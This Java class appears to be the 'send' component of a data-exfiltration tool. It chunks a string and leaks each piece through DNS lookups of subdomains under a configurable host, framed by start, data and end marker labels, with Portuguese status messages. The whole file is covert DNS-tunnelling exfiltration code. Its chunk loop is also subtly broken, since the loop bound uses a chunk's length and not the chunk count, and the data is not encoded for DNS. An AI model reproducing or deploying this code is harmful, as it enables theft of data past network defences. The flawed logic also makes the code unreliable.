package com.hase505.strategies.send;

import java.net.InetAddress;

public class DNSSendStrategy implements SendStrategy {
    private int chunkSize;
    private String hostName;
    private final String startOfCommunication = "s100.";
    private final String startOfData = "s200.";
    private final String endOfData = "s300.";

    public DNSSendStrategy(int chunkSize, String hostName) {
        this.chunkSize = chunkSize;
        this.hostName = hostName;
    }

    public int getChunkSize() {
        return chunkSize;
    }

    public String getHostName() {
        return hostName;
    }

    public void send(String dataToSend) {
        String[] splitedData =splitIntoChunks(dataToSend);

        try {
            System.out.println("Enviando comunicação inicial");
            InetAddress.getByName(startOfCommunication+hostName);
        } catch (java.net.UnknownHostException ignore){}

        try{
            System.out.println("Enviando arquivo inicial");
            InetAddress.getByName(startOfData+hostName);
        }catch(java.net.UnknownHostException ignore){}

        for(int i = 0; i<splitedData[i].length(); i++){
            try{
                System.out.println("Enviando chunk: "+(i+1));
                InetAddress.getByName(splitedData[i]+"."+hostName);
            }catch(java.net.UnknownHostException ignore){}
        }

        try{
            InetAddress.getByName(endOfData+hostName);
            System.out.println("Enviando fim da comunicação");
        }catch(java.net.UnknownHostException ignore){}

    }

    private String[] splitIntoChunks(String dataToSplit) {
        return dataToSplit.split("(?<=\\G.{" + chunkSize + "})");
    }

}
